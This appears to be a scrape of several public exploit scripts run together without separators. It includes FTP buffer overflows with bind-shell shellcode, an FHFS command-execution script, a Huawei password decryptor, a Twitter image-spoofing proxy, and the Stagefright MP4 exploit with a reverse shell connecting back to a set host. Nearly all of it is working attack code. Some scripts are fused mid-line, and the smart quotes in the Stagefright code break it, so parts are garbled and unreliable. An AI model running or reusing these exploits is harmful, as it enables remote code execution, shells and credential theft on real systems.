rop =  struct.pack("<I",0x77bf362c) # POP EBX / RET
rop += struct.pack("<I",0x41414141) # junk
rop += struct.pack("<I",0x41414141) # junk
rop += struct.pack("<I",0xFFFFFFFF) # 00000000
rop += struct.pack("<I",0x7e810b7e) # INC EBX / RET

rop += struct.pack("<I",0x77bebb36) # POP EBP / RET
rop += struct.pack("<I",0x7C862144) # SetProcessDEPPolicy

rop += struct.pack("<I",0x77bf3b47) # POP EDI / RET
rop += struct.pack("<I",0x77be1110) # RET
rop += struct.pack("<I",0x77bf1891) # POP ESI / RET
rop += struct.pack("<I",0x77be2091) # RET

rop += struct.pack("<I",0x7e6ea62b) # PUSHAD / RET

####

### Exploit-DB Note ROP for Windows SP3 English SP3
rop2 =  struct.pack("<I",0x7C9F880B) # POP EBX / RETN 7C9F880B
rop2 += struct.pack("<I",0x41414141) # junk
rop2 += struct.pack("<I",0x41414141) # junk
rop2 += struct.pack("<I",0xFFFFFFFF) # 00000000
rop2 += struct.pack("<I",0x77540FB2) # INC EBX / RETN 77540FB2
 
rop2 += struct.pack("<I",0x7C9FD315) # POP EBP / RETN 7C9FD315
rop2 += struct.pack("<I",0x7C862144) # SetProcessDEPPolicy
 
rop2 += struct.pack("<I",0x7C9FCEF2) # POP EDI / RETN 7C9FCEF2
rop2 += struct.pack("<I",0x7C9FCEF3) # RET 7C9FCEF3
rop2 += struct.pack("<I",0x7C9F9CA2) # POP ESI / RETN  7C9F9CA2
rop2 += struct.pack("<I",0x7C9FCEF3) # RETN
 
rop2 += struct.pack("<I",0x7E423AD9) # PUSHAD / RETN 7E423AD9
###


target = "192.168.1.71"
port = 21
junk = "\x41"*251
nops = "\x90"*100

exploit = junk + rop + nops + shellcode

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
	connect = sock.connect((target,port))
	sock.recv(1024)
	sock.send(exploit +"\r\n")
	sock.close()
except:
	print "Error to connect... "
#!/usr/bin/python
#
# FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution
#
# Author: Naser Farhadi
#
# Date: 26 August 2015 # Version: 2.1.2 # Tested on: Windows 7 SP1 (32 bit)
#
# Link : http://sourceforge.net/projects/fhfs/
#
# Description : FHFS is a FTP and HTTP Web Server package,
#               transparently based on HFS and FileZilla. FHFS is built to act as an all-in-one user-based file hosting website,
#               good for schools, businesses, etc. whose students/employees need to easily transport files. 
# Usage:
#       chmod +x FHFS.py
#       ./FHFS.py
#
# Video: http://youtu.be/ch5A2bQEB0I
##

import socket

url = raw_input("Enter URL : ")
try:
      while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((url, 80))
            cmd = raw_input("Enter command (E.g. calc) or press Ctrl+C to exit : ")
            req = "GET /?{.exec|"+cmd+".}"
            req += " HTTP/1.1\r\n\r\n"
            sock.send(req)
            sock.close()
            print "Done!"
except KeyboardInterrupt:
      print "Bye!"#!/usr/bin/python

# Exploit Title: PCMan's FTP Server v2.0 - GET command buffer overflow (remote shell)
# Date:  28 Aug 2015
# Exploit Author: Koby
# Vendor Homepage: http://pcman.openfoundry.org/
# Software Link: https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
# Version: 2.0.7
# Tested on: Windows XP SP3
# CVE : N/A

import socket
import sys

# msfvenom -p windows/shell_bind_tcp lhost=192.168.1.130 lport=4444 -b '\x00\x0a\x0b\x27\x36\xce\xc1\x04\x14\x3a\x44\xe0\x42\xa9\x0d' -f ruby
# Payload size: 352 bytes
shellcode = (
"\x29\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76" 
"\x0e\x69\x8c\x9b\xa3\x83\xee\xfc\xe2\xf4\x95\x64\x19\xa3" 
"\x69\x8c\xfb\x2a\x8c\xbd\x5b\xc7\xe2\xdc\xab\x28\x3b\x80" 
"\x10\xf1\x7d\x07\xe9\x8b\x66\x3b\xd1\x85\x58\x73\x37\x9f" 
"\x08\xf0\x99\x8f\x49\x4d\x54\xae\x68\x4b\x79\x51\x3b\xdb" 
"\x10\xf1\x79\x07\xd1\x9f\xe2\xc0\x8a\xdb\x8a\xc4\x9a\x72" 
"\x38\x07\xc2\x83\x68\x5f\x10\xea\x71\x6f\xa1\xea\xe2\xb8" 
"\x10\xa2\xbf\xbd\x64\x0f\xa8\x43\x96\xa2\xae\xb4\x7b\xd6" 
"\x9f\x8f\xe6\x5b\x52\xf1\xbf\xd6\x8d\xd4\x10\xfb\x4d\x8d" 
"\x48\xc5\xe2\x80\xd0\x28\x31\x90\x9a\x70\xe2\x88\x10\xa2" 
"\xb9\x05\xdf\x87\x4d\xd7\xc0\xc2\x30\xd6\xca\x5c\x89\xd3" 
"\xc4\xf9\xe2\x9e\x70\x2e\x34\xe4\xa8\x91\x69\x8c\xf3\xd4" 
"\x1a\xbe\xc4\xf7\x01\xc0\xec\x85\x6e\x73\x4e\x1b\xf9\x8d" 
"\x9b\xa3\x40\x48\xcf\xf3\x01\xa5\x1b\xc8\x69\x73\x4e\xc9" 
"\x61\xd5\xcb\x41\x94\xcc\xcb\xe3\x39\xe4\x71\xac\xb6\x6c" 
"\x64\x76\xfe\xe4\x99\xa3\x78\xd0\x12\x45\x03\x9c\xcd\xf4" 
"\x01\x4e\x40\x94\x0e\x73\x4e\xf4\x01\x3b\x72\x9b\x96\x73" 
"\x4e\xf4\x01\xf8\x77\x98\x88\x73\x4e\xf4\xfe\xe4\xee\xcd" 
"\x24\xed\x64\x76\x01\xef\xf6\xc7\x69\x05\x78\xf4\x3e\xdb" 
"\xaa\x55\x03\x9e\xc2\xf5\x8b\x71\xfd\x64\x2d\xa8\xa7\xa2" 
"\x68\x01\xdf\x87\x79\x4a\x9b\xe7\x3d\xdc\xcd\xf5\x3f\xca" 
"\xcd\xed\x3f\xda\xc8\xf5\x01\xf5\x57\x9c\xef\x73\x4e\x2a" 
"\x89\xc2\xcd\xe5\x96\xbc\xf3\xab\xee\x91\xfb\x5c\xbc\x37" 
"\x6b\x16\xcb\xda\xf3\x05\xfc\x31\x06\x5c\xbc\xb0\x9d\xdf" 
"\x63\x0c\x60\x43\x1c\x89\x20\xe4\x7a\xfe\xf4\xc9\x69\xdf" 
"\x64\x76")


# buffer overflow was found by fuzzing with ftp_pre_post (metasploit)
# bad data is a string of 2007 "A" characters to get to an EIP overwrite
# followed by the JMP ESP instruction 0x7c9d30eb in SHELL32.dll
baddata = '\x41'*2007+'\xeb\x30\x9d\x7c'
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# change target IP/port as needed
# run this script then to connect use nc for your windows shell
# nc [target IP address] 4444
connect=s.connect(('192.168.1.135',21))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('GET ' + baddata +'\x90'*15+ shellcode+ '\r\n')
s.close()
#!/usr/bin/python
# Exploit Title: PCMan's FTP Server v2.0 - RENAME command remote buffer overflow
# Date:  29 Aug 2015
# Exploit Author: Koby
# Vendor Homepage: http://pcman.openfoundry.org/
# Software Link: https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
# Version: 2.0.7
# Tested on: Windows XP SP3

import socket
import sys

# msfvenom -p windows/shell_bind_tcp lhost=192.168.1.130 lport=4444 -b '\x00\x0a\x0b\x27\x36\xce\xc1\x04\x14\x3a\x44\xe0\x42\xa9\x0d' -f ruby
# Payload size: 352 bytes
shellcode = (
"\x31\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\xb3\x93\xd2\x17\x83\xee\xfc\xe2\xf4\x4f\x7b\x50\x17"
"\xb3\x93\xb2\x9e\x56\xa2\x12\x73\x38\xc3\xe2\x9c\xe1\x9f" 
"\x59\x45\xa7\x18\xa0\x3f\xbc\x24\x98\x31\x82\x6c\x7e\x2b"
"\xd2\xef\xd0\x3b\x93\x52\x1d\x1a\xb2\x54\x30\xe5\xe1\xc4" 
"\x59\x45\xa3\x18\x98\x2b\x38\xdf\xc3\x6f\x50\xdb\xd3\xc6" 
"\xe2\x18\x8b\x37\xb2\x40\x59\x5e\xab\x70\xe8\x5e\x38\xa7" 
"\x59\x16\x65\xa2\x2d\xbb\x72\x5c\xdf\x16\x74\xab\x32\x62" 
"\x45\x90\xaf\xef\x88\xee\xf6\x62\x57\xcb\x59\x4f\x97\x92" 
"\x01\x71\x38\x9f\x99\x9c\xeb\x8f\xd3\xc4\x38\x97\x59\x16" 
"\x63\x1a\x96\x33\x97\xc8\x89\x76\xea\xc9\x83\xe8\x53\xcc" 
"\x8d\x4d\x38\x81\x39\x9a\xee\xfb\xe1\x25\xb3\x93\xba\x60" 
"\xc0\xa1\x8d\x43\xdb\xdf\xa5\x31\xb4\x6c\x07\xaf\x23\x92" 
"\xd2\x17\x9a\x57\x86\x47\xdb\xba\x52\x7c\xb3\x6c\x07\x7d" 
"\xbb\xca\x82\xf5\x4e\xd3\x82\x57\xe3\xfb\x38\x18\x6c\x73" 
"\x2d\xc2\x24\xfb\xd0\x17\xa2\xcf\x5b\xf1\xd9\x83\x84\x40" 
"\xdb\x51\x09\x20\xd4\x6c\x07\x40\xdb\x24\x3b\x2f\x4c\x6c" 
"\x07\x40\xdb\xe7\x3e\x2c\x52\x6c\x07\x40\x24\xfb\xa7\x79" 
"\xfe\xf2\x2d\xc2\xdb\xf0\xbf\x73\xb3\x1a\x31\x40\xe4\xc4" 
"\xe3\xe1\xd9\x81\x8b\x41\x51\x6e\xb4\xd0\xf7\xb7\xee\x16" 
"\xb2\x1e\x96\x33\xa3\x55\xd2\x53\xe7\xc3\x84\x41\xe5\xd5" 
"\x84\x59\xe5\xc5\x81\x41\xdb\xea\x1e\x28\x35\x6c\x07\x9e" 
"\x53\xdd\x84\x51\x4c\xa3\xba\x1f\x34\x8e\xb2\xe8\x66\x28" 
"\x22\xa2\x11\xc5\xba\xb1\x26\x2e\x4f\xe8\x66\xaf\xd4\x6b" 
"\xb9\x13\x29\xf7\xc6\x96\x69\x50\xa0\xe1\xbd\x7d\xb3\xc0" 
"\x2d\xc2")

# buffer overflow was found by fuzzing with ftp_pre_post (metasploit)
# bad data is a string of 2004 "A" characters to get to a EIP overwrite
# followed by the JMP ESP instruction 0x7cb48eed in SYSTEM32.dll
baddata = '\x41'*2004+'\xed\x8e\xb4\x7c'

# login to ftp followed by sending the bad data & payload
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.1.135',21))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('RENAME ' + baddata +'\x90'*50+ shellcode+ '\r\n')
s.close()
source: http://www.securityfocus.com/bid/56510/info

Multiple Huawei products are prone to a weak password encryption weakness.

Successful exploits may allow an attacker to decrypt stored passwords; this may aid in further attacks.

The following are vulnerable:

Huawei Quidway series
Huawei CX600 V600R001
Huawei CX600 V600R003C00SPC900
Huawei ME60 V600R002C07 and prior versions
AR 19/29/49 R2207 and prior versions 

from Crypto.Cipher import DES

def decode_char(c):
    if c == 'a':
        r = '?'
    else:
        r = c
    return ord(r) - ord('!')

def ascii_to_binary(s):
    assert len(s) == 24

    out = [0]*18
    i = 0
    j = 0

    for i in range(0, len(s), 4):
        y = decode_char(s[i + 0])
        y = (y << 6) & 0xffffff

        k = decode_char(s[i + 1])
        y = (y | k) & 0xffffff
        y = (y << 6) & 0xffffff

        k = decode_char(s[i + 2])
        y = (y | k) & 0xffffff
        y = (y << 6) & 0xffffff

        k = decode_char(s[i + 3])
        y = (y | k) & 0xffffff

        out[j+2] = chr(y       & 0xff)
        out[j+1] = chr((y>>8)  & 0xff)
        out[j+0] = chr((y>>16) & 0xff)

        j += 3

    return "".join(out)

def decrypt_password(p):
    r = ascii_to_binary(p)

    r = r[:16]

    d = DES.new("\x01\x02\x03\x04\x05\x06\x07\x08", DES.MODE_ECB)
    r = d.decrypt(r)

    return r.rstrip("\x00")

source: http://www.securityfocus.com/bid/56665/info

Twitter for iPhone is prone to a security vulnerability that lets attackers to perform a man-in-the-middle attack.

Attackers can exploit this issue to capture and modify pictures that the user sees in the application.

Twitter for iPhone 5.0 is vulnerable; other versions may also be affected. 

/*
  Twitter App, eavesdroping PoC

  Written by Carlos Reventlov <carlos@reventlov.com>
  License MIT
*/

package main

import (
  "fmt"
  "github.com/xiam/hyperfox/proxy"
  "github.com/xiam/hyperfox/tools/logger"
  "io"
  "log"
  "os"
  "path"
  "strconv"
  "strings"
)

const imageFile = "spoof.jpg"

func init() {
  _, err := os.Stat(imageFile)
  if err != nil {
    panic(err.Error())
  }
}

func replaceAvatar(pr *proxy.ProxyRequest) error {
  stat, _ := os.Stat(imageFile)
  image, _ := os.Open(imageFile)

  host := pr.Response.Request.Host

  if strings.HasSuffix(host, "twimg.com") == true {

    if pr.Response.ContentLength != 0 {

      file := "saved" + proxy.PS + pr.FileName

      var ext string

      contentType := pr.Response.Header.Get("Content-Type")

      switch contentType {
      case "image/jpeg":
        ext = ".jpg"
      case "image/gif":
        ext = ".gif"
      case "image/png":
        ext = ".png"
      case "image/tiff":
        ext = ".tiff"
      }

      if ext != "" {
        fmt.Printf("** Saving image.\n")

        os.MkdirAll(path.Dir(file), os.ModeDir|os.FileMode(0755))

        fp, _ := os.Create(file)

        if fp == nil {
          fmt.Errorf(fmt.Sprintf("Could not open file %s for writing.", file))
        }

        io.Copy(fp, pr.Response.Body)

        fp.Close()

        pr.Response.Body.Close()
      }

    }

    fmt.Printf("** Sending bogus image.\n")

    pr.Response.ContentLength = stat.Size()
    pr.Response.Header.Set("Content-Type", "image/jpeg")
    pr.Response.Header.Set("Content-Length",
strconv.Itoa(int(pr.Response.ContentLength)))
    pr.Response.Body = image
  }

  return nil
}

func main() {

  p := proxy.New()

  p.AddDirector(logger.Client(os.Stdout))

  p.AddInterceptor(replaceAvatar)

  p.AddLogger(logger.Server(os.Stdout))

  var err error

  err = p.Start()

  if err != nil {
    log.Printf(fmt.Sprintf("Failed to bind: %s.\n", err.Error()))
  }
}
#!/usr/bin/env python
# Joshua J. Drake (@jduck) of ZIMPERIUM zLabs
# Shout outs to our friends at Optiv (formerly Accuvant Labs)
# (C) Joshua J. Drake, ZIMPERIUM Inc, Mobile Threat Protection, 2015
# www.zimperium.com
#
# Exploit for RCE Vulnerability CVE-2015-1538 #1
# Integer Overflow in the libstagefright MP4 ‘stsc’ atom handling
#
# Don’t forget, the output of “create_mp4” can be delivered many ways!
# MMS is the most dangerous attack vector, but not the only one…
#
# DISCLAIMER: This exploit is for testing and educational purposes only. Any
# other usage for this code is not allowed. Use at your own risk.
#
# “With great power comes great responsibility.” – Uncle Ben
#
import struct
import socket
#
# Creates a single MP4 atom – LEN, TAG, DATA
#
def make_chunk(tag, data):
   if len(tag) != 4:
       raise ‘Yo! They call it “FourCC” for a reason.’
   ret = struct.pack(‘>L’, len(data) + 8)
   ret += tag
   ret += data
   return ret
#
# Make an ‘stco’ atom – Sample Table Chunk Offets
#
def make_stco(extra=”):
   ret =  struct.pack(‘>L’, 0) # version
   ret += struct.pack(‘>L’, 0) # mNumChunkOffsets
   return make_chunk(‘stco’, ret+extra)
#
# Make an ‘stsz’ atom – Sample Table Size
#
def make_stsz(extra=”):
   ret =  struct.pack(‘>L’, 0) # version
   ret += struct.pack(‘>L’, 0) # mDefaultSampleSize
   ret += struct.pack(‘>L’, 0) # mNumSampleSizes
   return make_chunk(‘stsz’, ret+extra)
#
# Make an ‘stts’ atom – Sample Table Time-to-Sample
#
def make_stts():
   ret =  struct.pack(‘>L’, 0) # version
   ret += struct.pack(‘>L’, 0) # mTimeToSampleCount
   return make_chunk(‘stts’, ret)
#
# This creates a single Sample Table Sample-to-Chunk entry
#
def make_stsc_entry(start, per, desc):
   ret = ”
   ret += struct.pack(‘>L’, start + 1)
   ret += struct.pack(‘>L’, per)
   ret += struct.pack(‘>L’, desc)
   return ret
#
# Make an ‘stsc’ chunk – Sample Table Sample-to-Chunk
#
# If the caller desires, we will attempt to trigger (CVE-2015-1538 #1) and
# cause a heap overflow.
#
def make_stsc(num_alloc, num_write, sp_addr=0x42424242, do_overflow = False):
   ret =  struct.pack(‘>L’, 0) # version/flags
   # this is the clean version…
   if not do_overflow:
       ret += struct.pack(‘>L’, num_alloc) # mNumSampleToChunkOffsets
       ret += ‘Z’ * (12 * num_alloc)
       return make_chunk(‘stsc’, ret)

   # now the explicit version. (trigger the bug)
   ret += struct.pack(‘>L’, 0xc0000000 + num_alloc) # mNumSampleToChunkOffsets
   # fill in the entries that will overflow the buffer
   for x in range(0, num_write):
       ret += make_stsc_entry(sp_addr, sp_addr, sp_addr)

   ret = make_chunk(‘stsc’, ret)

   # patch the data_size
   ret = struct.pack(‘>L’, 8 + 8 + (num_alloc * 12)) + ret[4:]

   return ret

#
# Build the ROP chain
#
# ROP pivot by Georg Wicherski! Thanks!
#
“””
(gdb) x/10i __dl_restore_core_regs
  0xb0002850 <__dl_restore_core_regs>: add r1, r0, #52 ; 0x34
  0xb0002854 <__dl_restore_core_regs+4>:   ldm r1, {r3, r4, r5}
  0xb0002858 <__dl_restore_core_regs+8>:   push    {r3, r4, r5}
  0xb000285c <__dl_restore_core_regs+12>:  ldm r0, {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11}
  0xb0002860 <__dl_restore_core_regs+16>:  ldm sp, {sp, lr, pc}
“””
“””
b0001144 <__dl_mprotect>:
b0001144:       e92d0090        push    {r4, r7}
b0001148:       e3a0707d        mov     r7, #125        ; 0x7d
b000114c:       ef000000        svc     0x00000000
b0001150:       e8bd0090        pop     {r4, r7}
b0001154:       e1b00000        movs    r0, r0
b0001158:       512fff1e        bxpl    lr
b000115c:       ea0015cc        b       b0006894 <__dl_raise+0x10>
“””
def build_rop(off, sp_addr, newpc_val, cb_host, cb_port):
   rop = ”
   rop += struct.pack(‘<L’, sp_addr + off + 0x10) # new sp
   rop += struct.pack(‘<L’, 0xb0002a98)           # new lr – pop {pc}
   rop += struct.pack(‘<L’, 0xb00038b2+1)         # new pc: pop {r0, r1, r2, r3, r4, pc}

   rop += struct.pack(‘<L’, sp_addr & 0xfffff000) # new r0 – base address (page aligned)
   rop += struct.pack(‘<L’, 0x1000)               # new r1 – length
   rop += struct.pack(‘<L’, 7)                    # new r2 – protection
   rop += struct.pack(‘<L’, 0xd000d003)           # new r3 – scratch
   rop += struct.pack(‘<L’, 0xd000d004)           # new r4 – scratch
   rop += struct.pack(‘<L’, 0xb0001144)           # new pc – _dl_mprotect

   native_start = sp_addr + 0x80
   rop += struct.pack(‘<L’, native_start)         # address of native payload
   #rop += struct.pack(‘<L’, 0xfeedfed5)          # top of stack…
   # linux/armle/shell_reverse_tcp (modified to pass env and fork/exit)
   buf =  ”
   # fork
   buf += ‘\x02\x70\xa0\xe3’
   buf += ‘\x00\x00\x00\xef’
   # continue if not parent…
   buf += ‘\x00\x00\x50\xe3’
   buf += ‘\x02\x00\x00\x0a’
   # exit parent
   buf += ‘\x00\x00\xa0\xe3’
   buf += ‘\x01\x70\xa0\xe3’
   buf += ‘\x00\x00\x00\xef’
   # setsid in child
   buf += ‘\x42\x70\xa0\xe3’
   buf += ‘\x00\x00\x00\xef’
   # socket/connect/dup2/dup2/dup2
   buf += ‘\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x05\x20\x81\xe2\x8c’
   buf += ‘\x70\xa0\xe3\x8d\x70\x87\xe2\x00\x00\x00\xef\x00\x60’
   buf += ‘\xa0\xe1\x6c\x10\x8f\xe2\x10\x20\xa0\xe3\x8d\x70\xa0’
   buf += ‘\xe3\x8e\x70\x87\xe2\x00\x00\x00\xef\x06\x00\xa0\xe1’
   buf += ‘\x00\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00\x00\xef\x06’
   buf += ‘\x00\xa0\xe1\x01\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00’
   buf += ‘\x00\xef\x06\x00\xa0\xe1\x02\x10\xa0\xe3\x3f\x70\xa0’
   buf += ‘\xe3\x00\x00\x00\xef’
   # execve(shell, argv, env)
   buf += ‘\x30\x00\x8f\xe2\x04\x40\x24\xe0’
   buf += ‘\x10\x00\x2d\xe9\x38\x30\x8f\xe2\x08\x00\x2d\xe9\x0d’
   buf += ‘\x20\xa0\xe1\x10\x00\x2d\xe9\x24\x40\x8f\xe2\x10\x00’
   buf += ‘\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00’
   buf += ‘\xef\x02\x00’
   # Add the connect back host/port
   buf += struct.pack(‘!H’, cb_port)
   cb_host = socket.inet_aton(cb_host)
   buf += struct.pack(‘=4s’, cb_host)
   # shell –
   buf += ‘/system/bin/sh\x00\x00’
   # argv –
   buf += ‘sh\x00\x00’
   # env –
   buf += ‘PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin\x00’

   # Add some identifiable stuff, just in case something goes awry…
   rop_start_off = 0x34
   x = rop_start_off + len(rop)
   while len(rop) < 0x80 – rop_start_off:
       rop += struct.pack(‘<L’, 0xf0f00000+x)
       x += 4

   # Add the native payload…
   rop += buf

   return rop

#
# Build an mp4 that exploits CVE-2015-1538 #1
#
# We mimic meow.3gp here…
#
def create_mp4(sp_addr, newpc_val, cb_host, cb_port):
   chunks = []

   # Build the MP4 header…
   ftyp =  ‘mp42’
   ftyp += struct.pack(‘>L’, 0)
   ftyp += ‘mp42’
   ftyp += ‘isom’
   chunks.append(make_chunk(‘ftyp’, ftyp))

   # Note, this causes a few allocations…
   moov_data = ”
   moov_data += make_chunk(‘mvhd’,
       struct.pack(‘>LL’, 0, 0x41414141) +
       (‘B’ * 0x5c) )

   # Add a minimal, verified trak to satisfy mLastTrack being set
   moov_data += make_chunk(‘trak’,
       make_chunk(‘stbl’,
           make_stsc(0x28, 0x28) +
           make_stco() +
           make_stsz() +
           make_stts() ))

   # Spray the heap using a large tx3g chunk (can contain binary data!)
   “””
      0x4007004e <_ZNK7android7RefBase9decStrongEPKv+2>:   ldr r4, [r0, #4]  ; load mRefs
      0x40070050 <_ZNK7android7RefBase9decStrongEPKv+4>:   mov r5, r0
      0x40070052 <_ZNK7android7RefBase9decStrongEPKv+6>:   mov r6, r1
      0x40070054 <_ZNK7android7RefBase9decStrongEPKv+8>:   mov r0, r4
      0x40070056 <_ZNK7android7RefBase9decStrongEPKv+10>:  blx 0x40069884    ; atomic_decrement
      0x4007005a <_ZNK7android7RefBase9decStrongEPKv+14>:  cmp r0, #1        ; must be 1
      0x4007005c <_ZNK7android7RefBase9decStrongEPKv+16>:  bne.n   0x40070076 <_ZNK7android7RefBase9decStrongEPKv+42>
      0x4007005e <_ZNK7android7RefBase9decStrongEPKv+18>:  ldr r0, [r4, #8]  ; load refs->mBase
      0x40070060 <_ZNK7android7RefBase9decStrongEPKv+20>:  ldr r1, [r0, #0]  ; load mBase._vptr
      0x40070062 <_ZNK7android7RefBase9decStrongEPKv+22>:  ldr r2, [r1, #12] ; load method address
      0x40070064 <_ZNK7android7RefBase9decStrongEPKv+24>:  mov r1, r6
      0x40070066 <_ZNK7android7RefBase9decStrongEPKv+26>:  blx r2            ; call it!
   “””
   page = ”
   off = 0  # the offset to the next object
   off += 8
   page += struct.pack(‘<L’, sp_addr + 8 + 16 + 8 + 12 – 28)    # _vptr.RefBase (for when we smash mDataSource)
   page += struct.pack(‘<L’, sp_addr + off) # mRefs
   off += 16
   page += struct.pack(‘<L’, 1)             # mStrong
   page += struct.pack(‘<L’, 0xc0dedbad)    # mWeak
   page += struct.pack(‘<L’, sp_addr + off) # mBase
   page += struct.pack(‘<L’, 16)            # mFlags (dont set OBJECT_LIFETIME_MASK)
   off += 8
   page += struct.pack(‘<L’, sp_addr + off) # the mBase _vptr.RefBase
   page += struct.pack(‘<L’, 0xf00dbabe)    # mBase.mRefs (unused)
   off += 16
   page += struct.pack(‘<L’, 0xc0de0000 + 0x00)  # vtable entry 0
   page += struct.pack(‘<L’, 0xc0de0000 + 0x04)  # vtable entry 4
   page += struct.pack(‘<L’, 0xc0de0000 + 0x08)  # vtable entry 8
   page += struct.pack(‘<L’, newpc_val)          # vtable entry 12
   rop = build_rop(off, sp_addr, newpc_val, cb_host, cb_port)
   x = len(page)
   while len(page) < 4096:
       page += struct.pack(‘<L’, 0xf0f00000+x)
       x += 4

   off = 0x34
   page = page[:off] + rop + page[off+len(rop):]
   spray = page * (((2*1024*1024) / len(page)) – 20)
   moov_data += make_chunk(‘tx3g’, spray)
   block = ‘A’ * 0x1c
   bigger = ‘B’ * 0x40
   udta = make_chunk(‘udta’,
       make_chunk(‘meta’,
           struct.pack(‘>L’, 0) +
           make_chunk(‘ilst’,
               make_chunk(‘cpil’,    make_chunk(‘data’, struct.pack(‘>LL’, 21, 0) + ‘A’)) +
               make_chunk(‘trkn’,    make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + ‘AAAABBBB’)) +
               make_chunk(‘disk’,    make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + ‘AAAABB’)) +
               make_chunk(‘covr’,    make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + block)) * 32 +
               make_chunk(‘\xa9alb’, make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + block)) +
               make_chunk(‘\xa9ART’, make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + block)) +
               make_chunk(‘aART’,    make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + block)) +
               make_chunk(‘\xa9day’, make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + block)) +
               make_chunk(‘\xa9nam’, make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + block)) +
               make_chunk(‘\xa9wrt’, make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + block)) +
               make_chunk(‘gnre’,    make_chunk(‘data’, struct.pack(‘>LL’, 1, 0) + block)) +
               make_chunk(‘covr’,    make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + block)) * 32 +
               make_chunk(‘\xa9ART’, make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + bigger)) +
               make_chunk(‘\xa9wrt’, make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + bigger)) +
               make_chunk(‘\xa9day’, make_chunk(‘data’, struct.pack(‘>LL’, 0, 0) + bigger)))
           )
       )
   moov_data += udta

   # Make the nasty trak
   tkhd1 = ”.join([
       ‘\x00’,       # version
       ‘D’ * 3,      # padding
       ‘E’ * (5*4),  # {c,m}time, id, ??, duration
       ‘F’ * 0x10,   # ??
       struct.pack(‘>LLLLLL’,
           0x10000,  # a00
           0,        # a01
           0,        # dx
           0,        # a10
           0x10000,  # a11
           0),       # dy
       ‘G’ * 0x14
       ])

   trak1 = ”
   trak1 += make_chunk(‘tkhd’, tkhd1)

   mdhd1 = ”.join([
       ‘\x00’,       # version
       ‘D’ * 0x17,   # padding
       ])

   mdia1 = ”
   mdia1 += make_chunk(‘mdhd’, mdhd1)
   mdia1 += make_chunk(‘hdlr’, ‘F’ * 0x3a)

   dinf1 = ”
   dinf1 += make_chunk(‘dref’, ‘H’ * 0x14)

   minf1 = ”
   minf1 += make_chunk(‘smhd’, ‘G’ * 0x08)
   minf1 += make_chunk(‘dinf’, dinf1)

   # Build the nasty sample table to trigger the vulnerability here.
   stbl1 = make_stsc(3, (0x1200 / 0xc) – 1, sp_addr, True) # TRIGGER

   # Add the stbl to the minf chunk
   minf1 += make_chunk(‘stbl’, stbl1)

   # Add the minf to the mdia chunk
   mdia1 += make_chunk(‘minf’, minf1)

   # Add the mdia to the track
   trak1 += make_chunk(‘mdia’, mdia1)

   # Add the nasty track to the moov data
   moov_data += make_chunk(‘trak’, trak1)

   # Finalize the moov chunk
   moov = make_chunk(‘moov’, moov_data)
   chunks.append(moov)

   # Combine outer chunks together and voila.
   data = ”.join(chunks)

   return data

if __name__ == ‘__main__’:
   import sys
   import mp4
   import argparse

   def write_file(path, content):
       with open(path, ‘wb’) as f:
           f.write(content)

   def addr(sval):
       if sval.startswith(‘0x’):
           return int(sval, 16)
       return int(sval)

   # The address of a fake StrongPointer object (sprayed)
   sp_addr   = 0x41d00010  # takju @ imm76i – 2MB (via hangouts)

   # The address to of our ROP pivot
   newpc_val = 0xb0002850 # point sp at __dl_restore_core_regs

   # Allow the user to override parameters
   parser = argparse.ArgumentParser()
   parser.add_argument(‘-c’, ‘–connectback-host’, dest=‘cbhost’, default=‘31.3.3.7’)
   parser.add_argument(‘-p’, ‘–connectback-port’, dest=‘cbport’, type=int, default=12345)
   parser.add_argument(‘-s’, ‘–spray-address’, dest=‘spray_addr’, type=addr, default=None)
   parser.add_argument(‘-r’, ‘–rop-pivot’, dest=‘rop_pivot’, type=addr, default=None)
   parser.add_argument(‘-o’, ‘–output-file’, dest=‘output_file’, default=‘cve-2015-1538-1.mp4’)
   args = parser.parse_args()

   if len(sys.argv) == 1:
       parser.print_help()
       sys.exit(–1)

   if args.spray_addr == None:
       args.spray_addr = sp_addr
   if args.rop_pivot == None:
       args.rop_pivot = newpc_val

   # Build the MP4 file…
   data = mp4.create_mp4(args.spray_addr, args.rop_pivot, args.cbhost, args.cbport)
   print(‘[*] Saving crafted MP4 to %s …’ % args.output_file)
   write_file(args.output_file, data) - See more at: https://blog.zimperium.com/the-latest-on-stagefright-cve-2015-1538-exploit-is-now-available-for-testing-purposes/#sthash.MbvoiMxd.dpuf# Title: MS15-100 Windows Media Center Command Execution
# Date : 11/09/2015
# Author: R-73eN
# Software: Windows Media Center
# Tested : Windows 7 Ultimate
# CVE : 2015-2509


banner = ""
banner += " ___        __        ____                 _    _  \n" 
